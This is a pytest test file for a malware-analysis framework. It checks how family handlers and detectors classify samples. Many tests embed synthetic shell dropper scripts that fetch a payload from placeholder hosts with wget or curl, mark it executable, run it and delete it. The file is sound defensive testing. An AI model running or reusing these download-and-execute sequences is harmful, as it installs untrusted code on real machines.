"""family handlerの非適用と失敗を区別する契約を検証する。"""

from __future__ import annotations

import importlib.util
import json
import logging
from pathlib import Path
import sys
from types import SimpleNamespace

import pytest


FRAMEWORK_ROOT = Path(__file__).resolve().parents[1]
COMMON_ROOT = FRAMEWORK_ROOT / "common"
REPOSITORY_ROOT = FRAMEWORK_ROOT.parent
for trusted in (REPOSITORY_ROOT, FRAMEWORK_ROOT, COMMON_ROOT):
    value = str(trusted)
    if value not in sys.path:
        sys.path.insert(0, value)

from analysis_contract import handler_result_quality  # noqa: E402
from handler_catalog import (  # noqa: E402
    HandlerNoEvidenceError,
    discover_handlers,
    execute_handler,
    load_handler,
)


def _automatic_spec(family: str):
    return next(item for item in discover_handlers() if item.family == family and item.automatic)


def _load_family_module(family: str, file_name: str):
    path = FRAMEWORK_ROOT / "malware" / family / file_name
    spec = importlib.util.spec_from_file_location(f"test_{family}_{path.stem}", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_execute_handler_maps_no_evidence_exception() -> None:
    """variant非一致をfailedでなく証拠なし結果へ正規化する。"""

    result = execute_handler(_automatic_spec("formbook_loader"), b"not-reviewed", "sample.exe")
    assert result["result"]["status"] == "not_applicable"
    quality = handler_result_quality(result["result"])
    assert quality["tier_name"] == "no_evidence"
    assert quality["sufficient"] is False


def test_dotnet_missing_stuff_is_no_evidence_but_parse_failure_remains_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """stuff不在とresource parser破損を別statusとして維持する。"""

    handler, _invocation = load_handler(_automatic_spec("dotnet_resource_loader"))
    monkeypatch.setitem(handler.__globals__, "resource_blobs", lambda _data: ([], []))
    with pytest.raises(HandlerNoEvidenceError):
        handler(b"MZ-valid-variant-without-stuff")

    monkeypatch.setitem(
        handler.__globals__,
        "resource_blobs",
        lambda _data: ([], ["dnfileでPEを解析できませんでした: ValueError"]),
    )
    with pytest.raises(ValueError) as failure:
        handler(b"MZ-broken")
    assert type(failure.value) is ValueError


def test_linux_downloader_ignores_placeholder_port_and_keeps_numeric_port() -> None:
    """format placeholderだけを除外し、実port付き配布URLは保持する。"""

    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    result = handler(
        b"""#!/bin/sh
wget http://placeholder.invalid:%d/payload -O placeholder
wget https://download.example:8443/stage -O stage
chmod +x stage
./stage
rm -f stage
"""
    )
    assert result["download_endpoints"] == [
        {
            "url": "https://download.example:8443/stage",
            "host": "download.example",
            "port": 8443,
            "path": "/stage",
            "role": "payload_distribution",
            "is_c2": False,
            "confidence": "confirmed_static",
            "target_file": "stage",
        }
    ]


def test_linux_downloader_contract_and_binary_rejection() -> None:
    """script契約を公開し、Go製Windows PE風データを適用対象外にする。"""

    spec = _automatic_spec("linux_downloader")
    assert spec.input_formats == ("script",)
    assert spec.minimum_evidence_score == 1
    handler, _invocation = load_handler(spec)
    detector = _load_family_module("linux_downloader", "detect.py")
    go_pe = b"MZ\x00Go build ID: runtime.main\nwget https://go.dev/doc/ -O doc; chmod +x doc; ./doc; rm -f doc\n"
    assert detector.detect(go_pe)["matched"] is False
    with pytest.raises(HandlerNoEvidenceError):
        handler(go_pe)

    weak_shell = b"#!/bin/sh\nwget https://example.invalid/p -O p\n"
    assert detector.detect(weak_shell)["matched"] is False
    with pytest.raises(HandlerNoEvidenceError):
        handler(weak_shell)

    correlated_shell = weak_shell + b"chmod +x p\n./p\nrm -f p\n"
    assert detector.detect(correlated_shell)["matched"] is True


def test_linux_downloader_correlates_multiple_targets_across_option_orderings() -> None:
    """option位置が異なる複数取得でも、同一targetの処理系列を対応付ける。"""

    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    detector = _load_family_module("linux_downloader", "detect.py")
    data = b"""#!/bin/sh
wget -qO alpha https://download.example/remote-a
chmod 755 alpha
./alpha campaign-a
rm -f alpha
curl https://download.example/remote-b --output beta
chmod u+x beta
./beta
rm beta
"""
    result = handler(data)
    assert result["correlated_targets"] == ["alpha", "beta"]
    assert {item["target_file"] for item in result["download_endpoints"]} == {"alpha", "beta"}
    assert result["execution_chain"]["wget_primary"] is True
    assert result["execution_chain"]["curl_fallback"] is True
    assert result["execution_chain"]["multiple_payloads"] is True
    assert detector.detect(data)["anchors"]["correlated_targets"] == ["alpha", "beta"]


@pytest.mark.parametrize(
    "data",
    [
        b"#!/bin/sh\nwget https://download.example/p -O downloaded\nchmod +x prepared\n./executed\nrm -f downloaded\n",
        b"#!/bin/sh\nwget https://download.example/p -O payload\nchmod +x payload\n./payload\nrm -f other\n",
    ],
    ids=["different_phase_targets", "different_cleanup_target"],
)
def test_linux_downloader_rejects_mismatched_targets(data: bytes) -> None:
    """無関係なファイル名のコマンドを寄せ集めても陽性にしない。"""

    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    detector = _load_family_module("linux_downloader", "detect.py")
    assert detector.detect(data)["matched"] is False
    with pytest.raises(HandlerNoEvidenceError):
        handler(data)


@pytest.mark.parametrize(
    "download_command",
    [
        b"wget https://download.example/payload -O ../payload",
        b"wget https://download.example/%2e%2e",
    ],
    ids=["unsafe_output_path", "unsafe_url_basename"],
)
def test_linux_downloader_rejects_unsafe_targets(download_command: bytes) -> None:
    """パスやpercent表現を含むtargetを単純basenameへ誤昇格しない。"""

    data = b"#!/bin/sh\n" + download_command + b"\nchmod +x payload\n./payload\nrm -f payload\n"
    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    detector = _load_family_module("linux_downloader", "detect.py")
    assert detector.detect(data)["matched"] is False
    with pytest.raises(HandlerNoEvidenceError):
        handler(data)


@pytest.mark.parametrize(
    "data",
    [
        (
            b"#!/bin/sh\ncat <<'PAYLOAD'\nwget https://download.example/payload\n"
            b"chmod +x payload\n./payload\nrm -f payload\nPAYLOAD\n"
        ),
        (
            b"#!/bin/sh\ncat <<'EOF-DOC'\nwget https://download.example/payload\n"
            b"chmod +x payload\n./payload\nrm -f payload\nEOF-DOC\n"
        ),
        (
            b"#!/bin/sh\ncat <<EOF.DOC\nwget https://download.example/payload\n"
            b"chmod +x payload\n./payload\nrm -f payload\nEOF.DOC\n"
        ),
        (
            b"#!/bin/sh\ncat <<" + b"\\" + b"EOF.DOC\nwget https://download.example/payload\n"
            b"chmod +x payload\n./payload\nrm -f payload\nEOF.DOC\n"
        ),
        (b"#!/bin/sh\n# wget https://download.example/payload\n  # chmod +x payload\n# ./payload\n# rm -f payload\n"),
        (
            b"#!/bin/sh\nscript='wget https://download.example/payload\n"
            b"chmod +x payload\n./payload\nrm -f payload'\nprintf '%s\\n' \"$script\"\n"
        ),
    ],
    ids=[
        "heredoc_body",
        "heredoc_hyphen_quoted",
        "heredoc_dot",
        "heredoc_backslash_quoted",
        "comments",
        "quoted_data",
    ],
)
def test_linux_downloader_ignores_non_executed_shell_text(data: bytes) -> None:
    """here-document、comment、quoted data本文を実行コマンドへ昇格しない。"""

    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    detector = _load_family_module("linux_downloader", "detect.py")
    assert detector.detect(data)["matched"] is False
    with pytest.raises(HandlerNoEvidenceError):
        handler(data)


def test_linux_downloader_rejects_invalid_utf8_prefix() -> None:
    """不正byteをreplacement文字へ変換してshell markerを拾わない。"""

    data = b"\xff" * 1000 + b"\nwget https://download.example/p\nchmod +x p\n./p\nrm -f p\n"
    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    detector = _load_family_module("linux_downloader", "detect.py")
    assert detector.detect(data)["matched"] is False
    with pytest.raises(HandlerNoEvidenceError):
        handler(data)


def test_linux_downloader_accepts_quoted_options_curl_remote_name_and_absolute_utilities() -> None:
    """quoted option、curl remote-name、絶対utility pathを安全に相関する。"""

    data = (
        b"\xef\xbb\xbf"
        + b"""#!/bin/sh
/usr/bin/wget "https://download.example/remote-a" --output-document="alpha"
/bin/chmod 755 "alpha"
./alpha campaign-a
/bin/rm -f "alpha"
/usr/bin/curl -fsSLO "https://download.example/beta"
/bin/chmod u+x "beta"
./beta
/bin/rm "beta"
"""
    )
    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    detector = _load_family_module("linux_downloader", "detect.py")
    result = handler(data)
    assert result["correlated_targets"] == ["alpha", "beta"]
    assert detector.detect(data)["anchors"]["correlated_targets"] == ["alpha", "beta"]


def test_linux_downloader_redacts_url_credentials_query_and_fragment() -> None:
    """公開endpointへuserinfo、query、fragment中の秘密値を残さない。"""

    data = b"""#!/bin/sh
wget "https://user-unique:pass-unique@download.example:8443/stage?token=secret-unique#frag-unique" -O stage
chmod +x stage
./stage
rm -f stage
"""
    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    result = handler(data)
    assert result["download_endpoints"] == [
        {
            "url": "https://download.example:8443/stage",
            "host": "download.example",
            "port": 8443,
            "path": "/stage",
            "role": "payload_distribution",
            "is_c2": False,
            "confidence": "confirmed_static",
            "target_file": "stage",
        }
    ]
    rendered = json.dumps(result, ensure_ascii=False)
    for secret in ("user-unique", "pass-unique", "secret-unique", "frag-unique"):
        assert secret not in rendered


def test_linux_downloader_allows_correlated_target_with_proc_scan() -> None:
    """同一target相関に具体的な/proc走査があればcleanupなしでも扱う。"""

    data = b"""#!/bin/sh
for proc_dir in /proc/[0-9]*; do ls -l /proc/$pid/exe; done
wget https://download.example/payload
chmod +x payload
./payload
"""
    handler, _invocation = load_handler(_automatic_spec("linux_downloader"))
    detector = _load_family_module("linux_downloader", "detect.py")
    assert detector.detect(data)["matched"] is True
    assert handler(data)["correlated_targets"] == ["payload"]


@pytest.mark.parametrize(
    "data",
    [
        b"\x7fELF\nwget https://example.invalid/p -O p\nchmod +x p\n./p\nrm -f p\n",
        b"#!/bin/sh\nwget https://example.invalid/p -O p\x00\nchmod +x p\n./p\nrm -f p\n",
        (b"#!/bin/sh\nwget https://example.invalid/p -O p\nchmod +x p\n./p\nrm -f p\n" + b"# padding\n" * 240_000),
    ],
    ids=["elf", "nul", "oversized"],
)
def test_linux_downloader_detector_rejects_non_script_inputs(data: bytes) -> None:
    """ELF、NUL入りデータ、過大入力は強い文字列相関があっても除外する。"""

    detector = _load_family_module("linux_downloader", "detect.py")
    assert detector.detect(data)["matched"] is False


def test_formbook_unreviewed_hash_is_no_evidence() -> None:
    """hash固定decryptorへ別variantを渡してもhandler failureにしない。"""

    handler, _invocation = load_handler(_automatic_spec("formbook_loader"))
    with pytest.raises(HandlerNoEvidenceError):
        handler(b"unreviewed-formbook-like-input")


def test_formbook_resource_parse_contains_dnfile_diagnostics(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Formbook ResourceSet parse中のdnfile warningだけをstderrへ出さない。"""

    module = _load_family_module("formbook_loader", "extract_config.py")
    logger = logging.getLogger("dnfile.synthetic-formbook-test")
    handler = logging.StreamHandler()
    logger.addHandler(handler)
    logger.setLevel(logging.WARNING)
    logger.propagate = False

    def noisy_parse(**_kwargs):
        logger.warning("dnfile-formbook-secret")
        return SimpleNamespace(net=None)

    monkeypatch.setattr(module.dnfile, "dnPE", noisy_parse)
    try:
        with pytest.raises(ValueError, match="CLRヘッダー"):
            module._resource_value(b"MZ")
        assert "dnfile-formbook-secret" not in capsys.readouterr().err

        logger.warning("dnfile-formbook-restored")
        assert "dnfile-formbook-restored" in capsys.readouterr().err
    finally:
        logger.removeHandler(handler)
        handler.close()


def test_efimer_generic_outer_anchors_are_no_evidence() -> None:
    """汎用PyInstaller/PyArmor文字列だけではEfimerへ分類しない。"""

    spec = _automatic_spec("efimer")
    assert spec.callable_name == "extract_config"
    assert spec.input_formats == ("pe",)
    data = b"MZpyarmor_runtime_000000python313.dllpyi-runtime-tmpdirinstallercampus"
    result = execute_handler(spec, data, "generic-pyinstaller.exe")
    assert result["result"]["status"] == "not_applicable"
    assert "CArchive" in result["result"]["reason"]
    assert result["executed_sample"] is False
    assert result["network_contacted"] is False
